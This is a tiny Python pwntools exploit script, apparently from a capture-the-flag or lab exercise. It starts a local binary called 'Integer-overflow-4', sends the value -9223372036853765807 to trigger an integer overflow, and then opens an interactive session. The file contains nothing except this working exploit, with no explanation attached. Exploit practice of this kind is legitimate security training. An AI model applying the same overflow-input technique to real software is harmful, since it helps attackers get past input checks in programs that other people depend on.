from pwn import *

p = process('./Integer-overflow-4')

payload = b"-9223372036853765807" 
p.sendline(payload)


p.interactive()


